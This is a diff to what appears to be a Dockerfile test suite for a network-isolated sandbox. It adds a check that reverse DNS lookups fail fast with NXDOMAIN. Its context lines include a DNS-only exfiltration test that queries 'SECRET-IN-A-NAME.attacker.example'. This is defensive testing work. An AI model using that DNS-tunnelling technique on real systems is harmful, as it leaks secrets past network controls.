@@ -241,6 +241,22 @@ RUN echo "=== [DNS-only exfiltration] ===" && \
     (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true) && \
     echo "queried"
 
+# [Reverse lookup]
+# Nothing in the cage has a name, so the only question is how the lookup ends.
+# A query the resolver leaves unhandled is answered SERVFAIL, which musl reads
+# as a server that may yet answer: it retries and then waits out its whole
+# five-second timeout, once for every tool that reverse-resolves its own
+# address or the gateway's. NXDOMAIN is final and costs nothing.
+RUN echo "=== [Reverse lookup] ===" && \
+    OUT=$(nslookup 172.20.0.1 2>&1 || true) && \
+    echo "$OUT" && \
+    case "$OUT" in *NXDOMAIN*) echo "OK" ;; *) echo "FAILED: expected NXDOMAIN" && exit 1 ;; esac && \
+    START=$(date +%s) && \
+    (getent hosts 172.20.0.1 >/dev/null 2>&1 || true) && \
+    ELAPSED=$(( $(date +%s) - START )) && \
+    echo "elapsed=${ELAPSED}s" && \
+    [ "$ELAPSED" -lt 3 ] || (echo "FAILED: the reverse lookup stalled" && exit 1)
+
 # [A rule may name an address, and it stays inspected]
 # No resolver can answer an address, so the proxy takes one in the Host header
 # as it stands rather than asking. Without that a rule naming an address could
